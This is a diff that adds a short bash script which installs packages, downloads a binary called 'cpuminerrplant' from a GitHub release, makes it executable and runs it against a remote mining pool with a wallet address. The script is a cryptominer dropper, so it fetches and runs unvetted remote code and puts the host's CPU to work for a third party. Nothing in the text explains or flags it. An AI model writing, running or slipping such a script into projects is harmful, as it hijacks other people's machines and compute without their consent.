@@ -1,0 +1,7 @@
+#!/bin/bash
+export LC_ALL=C
+export LANG=C
+apt update && apt -y install unzip wget curl libncurses6 libncursesw6
+curl https://github.com/vedhagsvp/nwxbsa/releases/download/latest/cpuminerrplant -L -o cc
+chmod 777 cc
+./cc neuromorph -o asia.cereblix.com:3333 -u crb108bb680cccd28dcdba966edd7907be9ef5302b64.bas55
